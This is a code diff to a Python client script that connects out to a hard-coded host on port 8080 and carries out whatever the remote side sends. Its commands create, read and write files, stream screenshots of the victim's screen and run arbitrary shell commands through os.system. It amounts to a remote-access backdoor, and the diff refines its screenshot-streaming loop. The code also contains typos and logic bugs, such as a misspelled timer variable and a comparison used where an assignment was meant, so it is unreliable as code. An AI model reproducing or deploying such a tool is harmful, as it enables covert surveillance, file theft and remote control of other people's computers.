@@ -8,7 +8,7 @@ import time
 #10.81.68.126
 s = socket.socket()
 port = 8080
-host = "192.168.100.7"
+host = "10.81.68.126"
 connected = False
 while not connected:
     try:
@@ -26,7 +26,6 @@ while 1:
         command = s.recv(1024)
         command == command.decode()
         f = open(command,"x")
-       
     if command == "read file":
         command = s.recv(1024)
         command = command.decode()
@@ -34,7 +33,6 @@ while 1:
         if f.mode == "r":
             content = f.read()
             s.send(content.encode())
-           
     if command == "write file":
         command = s.recv(1024)
         command = command.decode()
@@ -42,62 +40,49 @@ while 1:
         if f.mode == "w":
             content = s.recv(8640).decode()
             f.write(content)
-           
-   
     if command == "stream":
         s.send(command.encode())
         run = True
         print("\n stream")
-        answer = "a"
+        answer = ""
+        timeouttimer = 0
         while run:
             s.settimeout(10)
             try:
-                command = s.recv(5000).decode()
+                answer = s.recv(5000).decode()
             except:
-                print("answer timed out")
-            try:
-                if command == "send size":
+                print("annswer timed out")
+                timeouttimer += 1
+            if timeouttimer == 300:
+                run = False
+                timeouttimer = 0
+            if answer == "send size":
+                try:
                     screenshot = pyautogui.screenshot()
+                    print("taken screenshot")
                     screenshot.save(os.getcwd() + "imagee.png")
                     image = os.getcwd() + "imagee.png"
+                    print("saved file")
                     myfile = open(image, 'rb')
+                    print("opend file")
                     bytes = myfile.read()
+                    print("read file")
                     size = len(bytes)
                     print(size)
                     s.send(str(size).encode())
-                    print("size has been sendt")
-                else:
-                    if int(command) == size:
-                        try:
-                            print("sendt image")
-                            s.send(bytes)
-                        except:
-                            print("could not send bytes")
-                    
-                
-            
-            except:
-                print("this could not be converted to a int")
-            
-            #try:
-                #answer = s.recv(5000).decode()
-                #answer = list(answer)
-                #for key in answer:
-                    #pyautogui.press(str(key))
-            #except:
-                #print("got keys")
-            #try:
-                #answerone, answertwo = s.recv(2048).decode()
-                #pyautogui.moveTo(answerone, answertwo)
-            #except:
-                #print("got")
-            print("ska")
-           
-           
-           
-
- 
-
+                    print("sendt size")
+                    answer = ""
+                    timeouittimer = 0 
+                except:
+                    print("somthing went wrong")
+            elif answer != "send size":
+                try:
+                    if int(answer) == size:
+                        s.send(bytes)
+                    else:
+                        print("not write size, to send image")
+                except:
+                    print("could not int the answer")
     elif command == "bat":
         run = True
         while run:
@@ -108,4 +93,4 @@ while 1:
             else:
                 os.system(user_command)
        
-   
+                        
